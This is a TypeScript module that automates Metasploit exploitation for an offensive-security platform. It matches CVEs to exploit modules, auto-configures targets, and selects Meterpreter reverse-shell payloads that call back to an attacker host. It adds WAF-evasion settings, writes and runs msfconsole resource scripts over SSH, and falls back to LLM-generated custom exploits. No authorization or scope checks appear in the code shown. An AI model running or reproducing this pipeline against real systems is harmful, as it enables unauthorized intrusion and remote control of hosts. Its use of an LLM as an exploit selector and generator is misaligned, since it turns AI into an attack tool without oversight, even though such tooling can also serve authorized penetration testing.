/**
 * MSF Module Selection Engine
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Intelligent Metasploit module selection and auto-configuration.
 * Given a vulnerability + target context, this engine:
 *   1. Queries the Exploit Knowledge Store for matching MSF modules
 *   2. Ranks modules by reliability (MSF rank), platform match, and past success
 *   3. Auto-configures RHOSTS, RPORT, payload, and evasion options
 *   4. Falls back to LLM-generated custom exploits when no proven module exists
 *
 * Decision hierarchy:
 *   CVE exact match (MSF module) → Service+version match → LLM custom exploit
 *
 * @module msf-module-selector
 */

import { invokeLLM } from "../_core/llm";
import { searchExploits, lookupCveExploits, type ExploitDocument, type SearchResult } from "./exploit-knowledge-store";

// ─── Types ──────────────────────────────────────────────────────────────────

export interface MsfModuleCandidate {
  /** MSF module path (e.g., exploit/linux/http/nextcloud_rce) */
  modulePath: string;
  /** Human-readable name */
  name: string;
  /** Module description */
  description: string;
  /** MSF rank (0-600) */
  rank: number;
  /** Rank label */
  rankLabel: "excellent" | "great" | "good" | "normal" | "average" | "low" | "manual";
  /** Target platform */
  platform: string;
  /** CVEs this module exploits */
  cveIds: string[];
  /** Why this module was selected */
  selectionReason: string;
  /** Confidence score (0-100) */
  confidence: number;
  /** Auto-configured options */
  autoConfig: Record<string, string | number>;
  /** Recommended payload */
  recommendedPayload?: string;
  /** Evasion options */
  evasionOptions?: Record<string, string | number>;
}

export interface ModuleSelectionResult {
  /** Whether a suitable MSF module was found */
  found: boolean;
  /** The selected module (if found) */
  selectedModule?: MsfModuleCandidate;
  /** All candidate modules considered */
  candidates: MsfModuleCandidate[];
  /** Decision explanation */
  decision: string;
  /** Whether to fall back to custom exploit generation */
  fallbackToCustom: boolean;
  /** Reason for fallback (if applicable) */
  fallbackReason?: string;
}

export interface TargetContext {
  /** Target hostname or IP */
  hostname: string;
  /** Target IP */
  ip?: string;
  /** Target OS */
  os?: string;
  /** Target port */
  port?: number;
  /** Service running on the port */
  service?: string;
  /** Service version */
  serviceVersion?: string;
  /** Detected technologies */
  technologies?: string[];
  /** WAF detected */
  wafDetected?: string;
  /** Attacker IP for reverse connections */
  attackerHost?: string;
  /** Attacker port for reverse connections */
  attackerPort?: number;
}

export interface VulnContext {
  /** CVE ID */
  cveId?: string;
  /** Vulnerability title */
  title: string;
  /** Vulnerability description */
  description?: string;
  /** Severity */
  severity: string;
  /** CVSS score */
  cvssScore?: number;
}

// ─── Rank Utilities ─────────────────────────────────────────────────────────

function rankToLabel(rank: number): MsfModuleCandidate["rankLabel"] {
  if (rank >= 600) return "excellent";
  if (rank >= 500) return "great";
  if (rank >= 400) return "good";
  if (rank >= 300) return "normal";
  if (rank >= 200) return "average";
  if (rank >= 100) return "low";
  return "manual";
}

function rankToConfidence(rank: number): number {
  // Map MSF rank to a base confidence score
  if (rank >= 600) return 85;
  if (rank >= 500) return 75;
  if (rank >= 400) return 65;
  if (rank >= 300) return 50;
  if (rank >= 200) return 35;
  return 20;
}

// ─── Platform Matching ──────────────────────────────────────────────────────

function platformMatches(modulePlatform: string, targetOs?: string): boolean {
  if (!targetOs) return true; // Unknown OS — don't filter
  if (!modulePlatform || modulePlatform === "multi") return true;

  const mp = modulePlatform.toLowerCase();
  const to = targetOs.toLowerCase();

  if (mp.includes("linux") && (to.includes("linux") || to.includes("ubuntu") || to.includes("debian") || to.includes("centos"))) return true;
  if (mp.includes("windows") && to.includes("windows")) return true;
  if (mp.includes("unix") && (to.includes("linux") || to.includes("unix") || to.includes("bsd"))) return true;
  if (mp.includes("osx") && to.includes("mac")) return true;

  return false;
}

// ─── Payload Selection ──────────────────────────────────────────────────────

function selectPayload(platform: string, targetOs?: string, attackerHost?: string): string {
  const os = (targetOs || platform || "").toLowerCase();

  if (os.includes("windows")) {
    return attackerHost
      ? "windows/meterpreter/reverse_tcp"
      : "windows/meterpreter/bind_tcp";
  }
  if (os.includes("linux") || os.includes("unix")) {
    return attackerHost
      ? "linux/x64/meterpreter/reverse_tcp"
      : "linux/x64/meterpreter/bind_tcp";
  }
  // Generic
  return attackerHost
    ? "generic/shell_reverse_tcp"
    : "generic/shell_bind_tcp";
}

// ─── Auto-Configuration ─────────────────────────────────────────────────────

function autoConfigureModule(
  doc: ExploitDocument,
  target: TargetContext,
  vuln: VulnContext,
): Record<string, string | number> {
  const config: Record<string, string | number> = {};

  // RHOSTS — always set
  config.RHOSTS = target.ip || target.hostname;

  // RPORT — from vulnerability port or common defaults
  if (target.port) {
    config.RPORT = target.port;
  }

  // RHOST alias (some modules use RHOST instead of RHOSTS)
  config.RHOST = target.ip || target.hostname;

  // TARGETURI — try to infer from service
  const modulePath = doc.msfModulePath || "";
  if (modulePath.includes("http") || modulePath.includes("webapp")) {
    config.TARGETURI = "/";
  }

  // SSL — if port is 443 or 8443
  if (target.port === 443 || target.port === 8443) {
    config.SSL = "true";
  }

  // LHOST/LPORT for reverse payloads
  if (target.attackerHost) {
    config.LHOST = target.attackerHost;
    config.LPORT = target.attackerPort || 4444;
  }

  // VHOST for virtual hosting
  if (target.hostname && target.hostname !== target.ip) {
    config.VHOST = target.hostname;
  }

  return config;
}

function buildEvasionOptions(wafDetected?: string): Record<string, string | number> {
  const options: Record<string, string | number> = {};

  if (wafDetected) {
    // Enable common evasion options
    options.EnableContextEncoding = "true";
    options.DisablePayloadHandler = "false";

    if (wafDetected.toLowerCase().includes("cloudflare")) {
      options.HttpClientTimeout = 30;
      options.SSL = "true";
    }
  }

  return options;
}

// ─── Module Selection Engine ────────────────────────────────────────────────

/**
 * Select the best Metasploit module for a given vulnerability and target.
 * This is the main entry point for the MSF Module Selection Engine.
 */
export async function selectMsfModule(
  vuln: VulnContext,
  target: TargetContext,
): Promise<ModuleSelectionResult> {
  const candidates: MsfModuleCandidate[] = [];
  const reasons: string[] = [];

  // ── Strategy 1: CVE Exact Match ──
  if (vuln.cveId) {
    const cveExploits = await lookupCveExploits(vuln.cveId);
    const msfModules = cveExploits.filter(d => d.source === "metasploit" && d.msfModulePath);

    for (const doc of msfModules) {
      const rank = doc.msfRank || 300;
      let confidence = rankToConfidence(rank);

      // Boost for platform match
      if (platformMatches(doc.platform || "multi", target.os)) {
        confidence += 10;
      } else {
        confidence -= 20;
      }

      // Boost for reliability score from feedback
      if (doc.reliabilityScore && doc.reliabilityScore > 50) {
        confidence += 5;
      }

      candidates.push({
        modulePath: doc.msfModulePath!,
        name: doc.title,
        description: doc.description,
        rank,
        rankLabel: rankToLabel(rank),
        platform: doc.platform || "multi",
        cveIds: doc.cveIds,
        selectionReason: `CVE exact match: ${vuln.cveId}`,
        confidence: Math.min(95, confidence),
        autoConfig: autoConfigureModule(doc, target, vuln),
        recommendedPayload: selectPayload(doc.platform || "multi", target.os, target.attackerHost),
        evasionOptions: target.wafDetected ? buildEvasionOptions(target.wafDetected) : undefined,
      });
    }

    if (msfModules.length > 0) {
      reasons.push(`Found ${msfModules.length} MSF modules matching ${vuln.cveId}`);
    }
  }

  // ── Strategy 2: Service + Keyword Search ──
  if (candidates.length === 0) {
    const queryParts: string[] = [];
    if (vuln.cveId) queryParts.push(vuln.cveId);
    queryParts.push(vuln.title);
    if (target.service) queryParts.push(target.service);

    const results = await searchExploits(queryParts.join(" "), {
      limit: 10,
      sources: ["metasploit"],
      platform: target.os,
      boostWithCode: false,
    });

    for (const result of results) {
      const doc = result.document;
      if (!doc.msfModulePath) continue;

      const rank = doc.msfRank || 300;
      let confidence = rankToConfidence(rank);

      // Reduce confidence since this isn't a CVE exact match
      confidence -= 15;

      if (platformMatches(doc.platform || "multi", target.os)) {
        confidence += 5;
      }

      // Scale by search relevance score
      confidence = Math.round(confidence * (0.5 + result.score * 0.5));

      candidates.push({
        modulePath: doc.msfModulePath,
        name: doc.title,
        description: doc.description,
        rank,
        rankLabel: rankToLabel(rank),
        platform: doc.platform || "multi",
        cveIds: doc.cveIds,
        selectionReason: `Service/keyword match: ${result.matchReason}`,
        confidence: Math.min(80, Math.max(10, confidence)),
        autoConfig: autoConfigureModule(doc, target, vuln),
        recommendedPayload: selectPayload(doc.platform || "multi", target.os, target.attackerHost),
        evasionOptions: target.wafDetected ? buildEvasionOptions(target.wafDetected) : undefined,
      });
    }

    if (results.length > 0) {
      reasons.push(`Found ${results.length} MSF modules via service/keyword search`);
    }
  }

  // ── Sort candidates by confidence ──
  candidates.sort((a, b) => b.confidence - a.confidence);

  // ── Decision: Use MSF module or fall back to custom exploit ──
  const CONFIDENCE_THRESHOLD = 40;
  const bestCandidate = candidates[0];

  if (bestCandidate && bestCandidate.confidence >= CONFIDENCE_THRESHOLD) {
    return {
      found: true,
      selectedModule: bestCandidate,
      candidates,
      decision: `Selected MSF module \`${bestCandidate.modulePath}\` (confidence: ${bestCandidate.confidence}%, rank: ${bestCandidate.rankLabel}). ${reasons.join(". ")}`,
      fallbackToCustom: false,
    };
  }

  // ── Fallback to custom exploit generation ──
  const fallbackReason = candidates.length === 0
    ? "No Metasploit modules found for this vulnerability"
    : `Best candidate \`${bestCandidate?.modulePath}\` has low confidence (${bestCandidate?.confidence}%)`;

  return {
    found: false,
    candidates,
    decision: `No suitable MSF module found. ${fallbackReason}. Falling back to LLM-generated custom exploit.`,
    fallbackToCustom: true,
    fallbackReason,
  };
}

/**
 * Build MSF resource script (.rc) for automated execution.
 * This generates a complete MSF resource script that can be fed to msfconsole.
 */
export function buildMsfResourceScript(module: MsfModuleCandidate): string {
  const lines: string[] = [
    `# Auto-generated MSF resource script by AC3`,
    `# Module: ${module.modulePath}`,
    `# Target: ${module.autoConfig.RHOSTS || "unknown"}`,
    `# Confidence: ${module.confidence}%`,
    `# Reason: ${module.selectionReason}`,
    ``,
    `use ${module.modulePath}`,
  ];

  // Set options
  for (const [key, value] of Object.entries(module.autoConfig)) {
    lines.push(`set ${key} ${value}`);
  }

  // Set payload
  if (module.recommendedPayload) {
    lines.push(`set PAYLOAD ${module.recommendedPayload}`);
  }

  // Set evasion options
  if (module.evasionOptions) {
    for (const [key, value] of Object.entries(module.evasionOptions)) {
      lines.push(`set ${key} ${value}`);
    }
  }

  lines.push(``);
  lines.push(`# Verify options before running`);
  lines.push(`show options`);
  lines.push(``);
  lines.push(`# Execute`);
  lines.push(`exploit -j`);

  return lines.join("\n");
}

/**
 * Build msfconsole command string for SSH execution on the scan server.
 */
export function buildMsfCommand(module: MsfModuleCandidate): string {
  const rcContent = buildMsfResourceScript(module);
  // Write RC file and execute
  const rcPath = `/tmp/ac3_msf_${Date.now()}.rc`;
  return `cat > ${rcPath} << 'MSFRC'\n${rcContent}\nMSFRC\nmsfconsole -q -r ${rcPath}`;
}

/**
 * Use LLM to refine module selection when multiple candidates exist.
 * The LLM considers the full vulnerability context to pick the best module.
 */
export async function llmRefineModuleSelection(
  candidates: MsfModuleCandidate[],
  vuln: VulnContext,
  target: TargetContext,
): Promise<MsfModuleCandidate | null> {
  if (candidates.length <= 1) return candidates[0] || null;

  try {
    const candidateList = candidates.slice(0, 5).map((c, i) => (
      `${i + 1}. \`${c.modulePath}\` — ${c.name}\n   Rank: ${c.rankLabel} (${c.rank}), Platform: ${c.platform}, Confidence: ${c.confidence}%\n   CVEs: ${c.cveIds.join(", ") || "none"}\n   Reason: ${c.selectionReason}`
    )).join("\n\n");

    const response = await invokeLLM({
      _caller: "msf-module-selector.refine",
      _priority: "normal",
      messages: [
        {
          role: "system",
          content: "You are an expert Metasploit operator. Select the best module for the given vulnerability and target. Respond with ONLY the number (1-5) of the best candidate.",
        },
        {
          role: "user",
          content: `Vulnerability: ${vuln.title}${vuln.cveId ? ` (${vuln.cveId})` : ""}\nTarget: ${target.hostname}:${target.port || "?"} (${target.os || "unknown OS"}, service: ${target.service || "unknown"})\n\nCandidates:\n${candidateList}\n\nWhich module is the best choice? Reply with ONLY the number.`,
        },
      ],
    });

    const content = response.choices?.[0]?.message?.content?.trim() || "";
    const num = parseInt(content.replace(/\D/g, ""), 10);
    if (num >= 1 && num <= candidates.length) {
      return candidates[num - 1];
    }
  } catch {
    // Fall back to highest confidence
  }

  return candidates[0];
}
